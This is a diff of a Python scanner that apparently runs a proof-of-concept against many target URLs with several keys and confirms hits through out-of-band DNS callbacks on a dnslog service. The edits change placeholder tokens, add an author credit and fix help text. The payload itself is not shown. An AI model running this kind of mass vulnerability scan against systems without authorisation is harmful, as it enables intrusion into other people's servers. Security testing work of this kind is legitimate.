@@ -1,6 +1,11 @@
 #!/usr/bin/env python
 # -*- encoding: utf-8 -*-
 
+'''
+code by: Stu.
+公众号：安全黑板报
+'''
+
 import os
 import re
 import base64
@@ -54,7 +59,7 @@ def random_str(len):
 
 #查看dnslog状态
 def getdnslog(random_str):
-    dns_check = 'https://admin.dnslog.link/api/dns/xxxxxxx/%s/' % random_str#xxxxxxx为dnslog地址
+    dns_check = 'https://admin.dnslog.link/api/dns/token/%s/' % random_str#token 替换为http://admin.dnslog.link平台字符串
     res = requests.get(dns_check)
     return res.text.strip()
 
@@ -85,7 +90,7 @@ def check_vuln():
             
             for key_ in key:
                 random_str_ = random_str(8)
-                connect = poc(web_url,random_str_+".xxxxxxx.dnslog.link",key_)#xxxxxxx为dns地址
+                connect = poc(web_url,random_str_+".token.dnslog.link",key_)#token 替换为http://admin.dnslog.link平台字符串
                 if connect == False:
                     break
                 result = getdnslog(random_str_)
@@ -105,7 +110,7 @@ if __name__ == '__main__':
                                     usage='scan.py [optional]')
     parser.add_argument('-f',metavar='File',type=str,default='url.txt',help='Put Web url in url.txt')
     parser.add_argument('-u',metavar='Url',type=str,help='Put a Web url')
-    parser.add_argument('-t',metavar='THREADS',type=int,default='10',help='Num of scan threads,default 100')
+    parser.add_argument('-t',metavar='THREADS',type=int,default='10',help='Num of scan threads,default 10')
 
     if len(sys.argv)==1:
         sys.argv.append('-h')
